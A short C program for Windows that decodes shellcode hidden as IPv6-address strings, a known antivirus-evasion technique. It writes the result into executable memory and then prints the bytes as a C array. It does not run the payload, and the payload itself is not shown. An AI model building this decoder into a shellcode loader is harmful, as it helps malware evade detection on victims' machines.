#include <windows.h>
#include <stdio.h>
#include "shellcode.h"

void decode_ipv6(const char *ips[], int ip_count, unsigned char *decoded_shellcode)
{
    for (int i = 0; i < ip_count; i++)
    {
        unsigned int blocks[8];
        sscanf_s(ips[i], "%x:%x:%x:%x:%x:%x:%x:%x",
                 &blocks[0], &blocks[1], &blocks[2], &blocks[3],
                 &blocks[4], &blocks[5], &blocks[6], &blocks[7]);

        for (int j = 0; j < 8; j++)
        {
            decoded_shellcode[i * 16 + j * 2] = (unsigned char)(blocks[j] >> 8);
            decoded_shellcode[i * 16 + j * 2 + 1] = (unsigned char)(blocks[j]);
        }
    }
}

int main()
{
    LPVOID shellcode = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (shellcode == NULL)
        return 1;

    decode_ipv6(encoded, shellcode_len / 16, (unsigned char *)shellcode);

    printf("\nunsigned char shellcode[] = {");

    for (unsigned int i = 0; i < shellcode_len; i++)
    {
        if (i % 20 == 0)
            printf("\n\t");
        printf("0x%02x,", ((unsigned char *)shellcode)[i]);
    }

    printf("\n};\n");

    return 0;
}
